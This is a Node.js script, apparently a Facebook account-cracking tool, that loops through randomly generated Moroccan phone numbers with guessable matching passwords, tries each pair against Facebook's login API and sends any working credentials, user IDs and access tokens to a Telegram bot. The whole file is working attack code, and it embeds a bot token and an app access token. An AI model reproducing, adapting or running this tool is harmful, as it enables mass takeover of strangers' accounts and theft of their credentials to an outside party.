import axios from 'axios';
import colors from 'colors';
import figlet from 'figlet';
console.clear();
console.log(figlet.textSync('FaceBook') + colors.yellow("Whisper </>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"));
console.log(`FB: ${colors.cyan('OussamaBakrine')}`);
console.log(colors.yellow("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"));

const ID = '1758975211';
const tok = '7160121436:AAEb846gUsrXPjPTw5t2ERT1zNxqkZzd9nA';
const user = '1234567890';

async function code_whisper(email, password) {
    const url = 'https://api.facebook.com/method/auth.login';
    const headers = {
        'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
        'Accept-Language': 'en-US,en;q=0.5'
    };
    const data = {
        'email': email,
        'password': password,
        'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        'locale': "en_DZ",
        'format': 'JSON'
    };
    try {
        const req = await axios.post(url, data, { headers: headers });
        const id = req.data.uid;
        const con = req.data.identifier;
        const tkn = req.data.access_token;
        const tlg = `https://api.telegram.org/bot${tok}/sendMessage?chat_id=${ID}&text=.💀. Hacked FaceBook From @OussamaBakrine💀.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.❤. ID ==> ${id}\n.✉. User ==> ${email} \n.🚫. Pass ==> ${password}\n.📨. Confirmed user ==> ${con}\n.📃. Access Token ==> ${tkn} \n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.😈`;
        await axios.post(tlg);
        console.log(colors.green(`victim : ${email} | ${password}`));
    } catch (error) {
        console.error(colors.red(`Error processing ${email} | ${password}: ${error.message}`));
    }
}

async function runBatch(email, password, batchSize, delay) {
    let batchPromises = [];
    for (let i = 0; i < batchSize; i++) {
        batchPromises.push(
            new Promise(async (resolve) => {
                try {
                    const url = 'https://api.facebook.com/method/auth.login';
                    const headers = {
                        'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
                        'Accept-Language': 'en-US,en;q=0.5'
                    };
                    const data = {
                        'email': email,
                        'password': password,
                        'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                        'locale': "en_DZ",
                        'format': 'JSON'
                    };
                    const req = await axios.post(url, data, { headers: headers });
                    if ('access_token' in req.data) {
                        await code_whisper(email, password);
                    } else if (req.data.error_msg.includes('(405)')) {
                        console.log(colors.yellow(`CheckPoint ${email}:${password}`));
                        await axios.post(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${ID}&text=.💀.Owner @oussamabakrine💀.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.\n.✉. E-mail ==> ${email} \n.🚫. PassWord ==> ${password} \n.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.😈 هق مشا.`);
                    } else {
                        console.log(colors.red(`num => ${email} | pass => ${password}`));
                    }
                } finally {
                    resolve();
                }
            })
        );
        // تأخير بين كل عملية وأخرى، العملية الثانية تبدأ بعد ثانية، والثالثة بعد ثانيتين، وهكذا.
        await new Promise(r => setTimeout(r, i * delay));
    }
    await Promise.all(batchPromises);
}

function generateRandomData() {
    const whisper = Array.from({ length: 7 }, () => user[Math.floor(Math.random() * user.length)]).join('');
    const email = '+21261' + whisper;
    const password = '061' + whisper;
    return { email, password };
}

async function main() {
    const batchSize = 15; // عدد العمليات المتزامنة
    const delay = 1000; // التأخير بين العمليات بالمللي ثانية (1 ثانية)

    while (true) {
        const { email, password } = generateRandomData();
        console.log(colors.cyan(`Checking: ${email} | ${password}`));
        await runBatch(email, password, batchSize, delay);
        console.log(colors.green('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
    }
}

main();
